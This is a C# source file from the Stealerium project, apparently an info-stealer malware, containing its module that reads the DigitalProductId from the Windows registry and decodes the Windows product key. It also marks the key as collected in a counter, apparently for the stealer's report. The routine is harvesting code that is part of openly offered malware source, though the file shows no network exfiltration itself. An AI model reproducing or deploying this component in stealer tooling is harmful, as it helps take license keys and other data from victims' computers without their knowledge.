using System;
using System.Collections;
using System.Collections.Generic;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    public class ProductKey
    {
        /// <summary>
        ///     Decodes Windows Product Key from the DigitalProductId.
        ///     This method applies to DigitalProductId from Windows 8 or newer versions of Windows.
        /// </summary>
        /// <param name="digitalProductId">DigitalProductId to decode</param>
        /// <returns>Decoded Windows Product Key as a string</returns>
        public static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
        {
            var key = string.Empty;
            const int keyOffset = 52;
            var isWin8 = (byte) ((digitalProductId[66] / 6) & 1);
            digitalProductId[66] = (byte) ((digitalProductId[66] & 0xf7) | ((isWin8 & 2) * 4));

            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            var last = 0;
            for (var i = 24; i >= 0; i--)
            {
                var current = 0;
                for (var j = 14; j >= 0; j--)
                {
                    current *= 256;
                    current = digitalProductId[j + keyOffset] + current;
                    digitalProductId[j + keyOffset] = (byte) (current / 24);
                    current %= 24;
                    last = current;
                }

                key = digits[current] + key;
            }

            var keypart1 = key.Substring(1, last);
            var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
            key = keypart1 + "N" + keypart2;

            for (var i = 5; i < key.Length; i += 6) key = key.Insert(i, "-");

            return key;
        }

        /// <summary>
        ///     Decodes Windows Product Key from the DigitalProductId.
        ///     This method applies to DigitalProductId from Windows 7 or lower versions of Windows.
        /// </summary>
        /// <param name="digitalProductId">DigitalProductId to decode</param>
        /// <returns>Decoded Windows Product Key as a string</returns>
        private static string DecodeProductKey(IReadOnlyList<byte> digitalProductId)
        {
            const int keyStartIndex = 52;
            const int keyEndIndex = keyStartIndex + 15;
            char[] digits =
            {
                'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R',
                'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9'
            };
            const int decodeLength = 29;
            const int decodeStringLength = 15;
            var decodedChars = new char[decodeLength];
            var hexPid = new ArrayList();
            for (var i = keyStartIndex; i <= keyEndIndex; i++) hexPid.Add(digitalProductId[i]);
            for (var i = decodeLength - 1; i >= 0; i--)
                // Every sixth char is a separator.
                if ((i + 1) % 6 == 0)
                {
                    decodedChars[i] = '-';
                }
                else
                {
                    // Do the actual decoding.
                    var digitMapIndex = 0;
                    for (var j = decodeStringLength - 1; j >= 0; j--)
                    {
                        var byteValue = (digitMapIndex << 8) | (byte) hexPid[j];
                        hexPid[j] = (byte) (byteValue / 24);
                        digitMapIndex = byteValue % 24;
                        decodedChars[i] = digits[digitMapIndex];
                    }
                }

            return new string(decodedChars);
        }

        /// <summary>
        ///     Decodes Windows Product Key from DigitalProductId with specified DigitalProductId version.
        /// </summary>
        /// <param name="digitalProductId"></param>
        /// <param name="digitalProductIdVersion"></param>
        /// <returns></returns>
        private static string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId,
            DigitalProductIdVersion digitalProductIdVersion)
        {
            var productKey = digitalProductIdVersion == DigitalProductIdVersion.Windows8AndUp
                ? DecodeProductKeyWin8AndUp(digitalProductId)
                : DecodeProductKey(digitalProductId);
            return productKey;
        }

        public static string GetWindowsProductKeyFromRegistry()
        {
            var localKey =
                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem
                    ? RegistryView.Registry64
                    : RegistryView.Registry32);

            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                ?.GetValue("DigitalProductId");
            if (registryKeyValue == null)
                return "Failed to get DigitalProductId from registry";
            var digitalProductId = (byte[]) registryKeyValue;
            localKey.Close();
            var isWin8OrUp =
                (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2)
                ||
                Environment.OSVersion.Version.Major > 6;

            Counter.ProductKey = true;
            return GetWindowsProductKeyFromDigitalProductId(digitalProductId,
                isWin8OrUp ? DigitalProductIdVersion.Windows8AndUp : DigitalProductIdVersion.UpToWindows7);
        }

        /// <summary>
        ///     Enumeration that specifies DigitalProductId version
        /// </summary>
        private enum DigitalProductIdVersion
        {
            /// <summary>
            ///     All systems up to Windows 7 (Windows 7 and older versions)
            /// </summary>
            UpToWindows7,

            /// <summary>
            ///     Windows 8 and up (Windows 8 and newer versions)
            /// </summary>
            Windows8AndUp
        }
    }
}